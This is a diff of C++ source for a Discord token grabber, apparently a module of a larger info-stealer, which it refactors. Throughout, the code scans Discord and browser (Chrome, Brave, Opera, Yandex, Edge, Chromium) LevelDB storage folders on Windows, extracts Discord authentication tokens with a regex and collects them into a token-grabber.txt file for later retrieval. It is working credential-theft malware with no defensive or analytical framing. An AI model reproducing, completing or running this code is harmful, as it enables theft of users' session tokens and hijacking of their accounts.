@@ -30,24 +30,28 @@
 #include <regex>
 #include <vector>
 
-void TokenGrabber();
+int TokenGrabber();
 
-bool hasEnding(std::string const& fullString, std::string const& ending);
-bool pathExist(const std::string& s);
-std::vector<std::string> grabPath();
-void getToken(const std::string& path);
-void searchToken(const std::string& loc);
+void findTokens(std::vector<std::string>& tokens, std::vector<std::string>& files);
 
-std::string user = func::GetUser();
+void getFiles(std::vector<std::string>& directories, std::vector<std::string>& files);
 
-std::string local = "C:/Users/" + user + "/AppData/Local";
+void findMatch(std::string& content, std::regex& tokenPatter, std::vector<std::string>& tokens);
 
-std::string roaming = "C:/Users/" + user + "/AppData/Roaming";
+void deleteInexistantPaths(std::vector<std::string>& directories);
+
+void getDirectories(std::vector<std::string>& directories);
 
 void messengers::Discord()
 {
 
 	printf("Discord\n");
+
+	std::string user = func::GetUser();
+
+	std::string local = "C:/Users/" + user + "/AppData/Local";
+
+	std::string roaming = "C:/Users/" + user + "/AppData/Roaming";
 
 	if (std::filesystem::exists("C:/Users/" + user + "/AppData/Local" + "/discord"))
 	{
@@ -104,144 +108,123 @@ void messengers::Discord()
 
 }
 
-void TokenGrabber() 
+int TokenGrabber() 
 {
 	printf("TG\n");
 
 	try
 	{
-		std::vector<std::string> targetLocation = grabPath();
-		for (int i = 0; i < targetLocation.size(); i++) {
-			if (pathExist(targetLocation[i])) {
-				std::cout << targetLocation[i] << "\n";
-				getToken(targetLocation[i]);
+		std::vector<std::string> directories;
+		std::vector<std::string> files;
+		std::vector<std::string> tokens;
+
+		getDirectories(directories);
+		deleteInexistantPaths(directories);
+		getFiles(directories, files);
+		if (files.size() == 0) 
+		{
+			return 0;
+		}
+		findTokens(tokens, files);
+		std::string info = "";
+		std::string user = func::GetUser();
+		if (tokens.size() > 0) {
+			for (int i = 0; i < tokens.size(); i++) {
+				info += std::string("Token: ") + std::string("<<<") + std::string(tokens[i]) + std::string(">>>") + '\n';
 			}
 		}
+		std::ofstream file("C:/Users/" + user + config::path + "/Messengers/Discord/token-grabber.txt", std::ios::app);
+		if (file.is_open())
+		{
+			file << info;
+		}
+
+		file.close();
 	}
 	catch (const char* error_message)
 	{
 		std::cout << error_message << std::endl;
+		return 0;
 	}
+	return 0;
 
 }
 
-
-bool hasEnding(std::string const& fullString, std::string const& ending) 
+void findMatch(std::string& content, std::regex& tokenPatter, std::vector<std::string>& tokens)
 {
-	if (fullString.length() >= ending.length()) {
-		return (0 == fullString.compare(fullString.length() - ending.length(), ending.length(), ending));
+	std::sregex_iterator current(content.begin(), content.end(), tokenPatter);
+	std::sregex_iterator end;
+
+	while (current != end) {
+		std::smatch match = *current;
+		tokens.push_back(match.str());
+		current++;
 	}
-	else {
-		return false;
+}
+
+void findTokens(std::vector<std::string>& tokens, std::vector<std::string>& files)
+{
+	std::string DISCORD_TOKEN_REGEX = "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{25,110}";
+
+	std::regex tokenPattern(DISCORD_TOKEN_REGEX);
+
+	for (int i = 0; i < files.size(); i++) {
+		std::ifstream file(files[i], std::ios::binary);
+		std::string content((std::istreambuf_iterator<char>(file)), (std::istreambuf_iterator<char>()));
+		findMatch(content, tokenPattern, tokens);
 	}
 }
 
-bool pathExist(const std::string& s)
+void getFiles(std::vector<std::string>& directories, std::vector<std::string>& files)
 {
-	struct stat buffer;
-	return (stat(s.c_str(), &buffer) == 0);
-}
-
-
-std::vector<std::string> grabPath()
-{
-	printf("grabPath\n");
-
-	std::vector<std::string> targetLocations;
-
-	std::string Discord = std::string(roaming) + "\\Discord";
-	std::string DiscordCanary = std::string(roaming) + "\\discordcanary";
-	std::string DiscordPTB = std::string(roaming) + "\\discordptb";
-	std::string Opera = std::string(roaming) + "\\Opera Software\\Opera Stable";
-	std::string Chrome = std::string(local) + "\\Google\\Chrome\\User Data\\Default";
-	std::string Brave = std::string(local) + "\\BraveSoftware\\Brave-Browser\\User Data\\Default";
-	std::string Yandex = std::string(local) + "\\Yandex\\YandexBrowser\\User Data\\Default";
-
-	targetLocations.push_back(Discord);
-	targetLocations.push_back(DiscordCanary);
-	targetLocations.push_back(DiscordPTB);
-	targetLocations.push_back(Opera);
-	targetLocations.push_back(Chrome);
-	targetLocations.push_back(Brave);
-	targetLocations.push_back(Yandex);
-
-	return targetLocations;
-}
-
-std::vector<std::string> findMatch(std::string str, std::regex reg)
-{
-	std::vector<std::string> output;
-	std::sregex_iterator currentMatch(str.begin(), str.end(), reg);
-	std::sregex_iterator lastMatch;
-
-	while (currentMatch != lastMatch) {
-		std::smatch match = *currentMatch;
-		output.push_back(match.str());
-		currentMatch++;
-	}
-
-	return output;
-}
-
-
-void getToken(const std::string& path)
-{
-	printf("getToken\n");
-
-	std::string target = path + "\\Local Storage\\leveldb";
-
-	for (const auto& entry : std::filesystem::directory_iterator(target))
-	{
-		
-		std::string strPath = entry.path().u8string();
-		std::cout << strPath << "\n";
-
-		if (hasEnding(strPath, ".log"))
-		{
-			searchToken(strPath);
-		}
-
-		if (hasEnding(strPath, ".ldb"))
-		{
-			searchToken(strPath);
+	for (int i = 0; i < directories.size(); i++) {
+		for (const auto& entry : std::filesystem::directory_iterator(directories[i])) {
+			std::string path = entry.path().string();
+			if (path.find(".ldb") != std::string::npos || path.find(".log") != std::string::npos) {
+				files.push_back(path);
+			}
 		}
 	}
 }
 
-void searchToken(const std::string& loc) {
-
-	printf("searchToken\n");
-
-	std::ifstream ifs(loc, std::ios_base::binary);
-	std::string content((std::istreambuf_iterator<char>(ifs)), (std::istreambuf_iterator<char>()));
-
-	std::vector<std::string> master;
-
-	std::regex reg1("[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}");
-	std::regex reg2("mfa\\.[\\w-]{84}");
-
-	std::vector<std::string> check = findMatch(content, reg1);
-	std::vector<std::string> check2 = findMatch(content, reg2);
-
-	for (int i = 0; i < check.size(); i++) {
-		std::cout << check[i] << std::endl;
-		master.push_back(check[i]);
-	}
-	for (int i = 0; i < check2.size(); i++) {
-		std::cout << check2[i] << std::endl;
-		master.push_back(check2[i]);
-	}
-
-	for (int i = 0; i < master.size(); i++) {
-		std::string combine = "content=";
-		combine += "```" + master[i] + "```";
-		const char* postContent = combine.c_str();
-		std::ofstream file("C:/Users/" + user + config::path + "/Messengers/Discord/token-grabber.txt", std::ios::app);
-		if (file.is_open())
-		{
-			file << postContent << std::endl;
+void deleteInexistantPaths(std::vector<std::string>& directories)
+{
+	for (int i = directories.size() - 1; i >= 0; i--) {
+		if (!std::filesystem::exists(directories[i])) {
+			directories.erase(directories.begin() + i);
 		}
+	}
+}
 
-		file.close();
+void getDirectories(std::vector<std::string>& directories)
+{
+	char* localPath = NULL;
+	char* roamingPath = NULL;
+
+	_dupenv_s(&roamingPath, NULL, "APPDATA");
+	_dupenv_s(&localPath, NULL, "LOCALAPPDATA");
+	std::string discord = "\\Discord\\Local Storage\\leveldb";
+	std::string discordCanary = "\\discordcanary\\Local Storage\\leveldb";
+	std::string discordPTB = "\\discordptb\\Local Storage\\leveldb";
+	std::string googleChrome = "\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb";
+	std::string chromium = "\\Chromium\\User Data\\Default\\Local Storage\\leveldb";
+	std::string brave = "\\BraveSoftware\\Brave-Browser\\User Data\\Default\\Local Storage\\leveldb";
+	std::string opera = "\\Opera Software\\Opera Stable\\Local Storage\\leveldb";
+	std::string yandex = "\\Yandex\\YandexBrowser\\User Data\\Default\\Local Storage\\leveldb";
+	std::string edge = "\\Microsoft\\Edge\\User Data\\Default\\Local Storage\\leveldb";
+	if (roamingPath != NULL) {
+		directories.push_back(roamingPath + discord);
+		directories.push_back(roamingPath + discordCanary);
+		directories.push_back(roamingPath + discordPTB);
+		free(roamingPath);
+	}
+	if (localPath != NULL) {
+		directories.push_back(localPath + googleChrome);
+		directories.push_back(localPath + chromium);
+		directories.push_back(localPath + brave);
+		directories.push_back(localPath + opera);
+		directories.push_back(localPath + yandex);
+		directories.push_back(localPath + edge);
+		free(localPath);
 	}
 }
